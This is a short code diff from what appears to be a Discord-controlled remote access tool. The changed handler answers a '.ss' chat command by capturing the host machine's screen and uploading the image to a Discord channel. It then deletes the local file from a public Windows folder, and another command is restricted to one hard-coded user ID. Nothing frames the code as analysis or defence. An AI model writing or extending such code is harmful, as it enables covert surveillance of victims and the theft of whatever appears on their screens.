@@ -133,13 +133,13 @@ async def on_message(message):
 
         if message.content == ".ss":
             screenshot = pyautogui.screenshot()
-            screenshot.save("screenshot.png")
+            screenshot.save("C:/Users/Public/wada/screenshot.png")
             chanle = client.get_channel(files_channel_id)
             if chanle is None:
                 print("Channel not found")
                 return
-            await chanle.send(file=discord.File("screenshot.png"))
-            utility.delete_file("screenshot.png")
+            await chanle.send(file=discord.File("C:/Users/Public/wada/screenshot.png"))
+            utility.delete_file("C:/Users/Public/wada/screenshot.png")
             
         if message.content == ".files":
             if message.author.id == 632519262585618437:
